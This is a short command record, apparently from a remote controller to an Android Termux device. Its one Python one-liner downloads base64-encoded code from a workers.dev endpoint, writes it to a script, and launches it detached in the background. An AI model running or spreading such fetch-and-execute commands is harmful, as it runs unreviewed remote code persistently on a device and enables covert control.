FROM: cloud-controller
TO: termux2
ACTION: CMD
CMD: python3 -c "import json,base64,urllib.request;d=json.load(urllib.request.urlopen('https://eon-p2p-cloud.exportdefaultasyncfetchrequestenvconsturl.workers.dev/sync/memory?limit=200'));[open('/data/data/com.termux/files/home/eon_channel_v2.py','w').write(base64.b64decode(e['content']).decode()) for e in d['entries'] if e['id']=='drop/eon_channel_v2']" && rm -f /tmp/eon-channel-v2.lock && setsid nohup python3 /data/data/com.termux/files/home/eon_channel_v2.py >/tmp/eon-channel-v2.log 2>&1 &
ACK: yes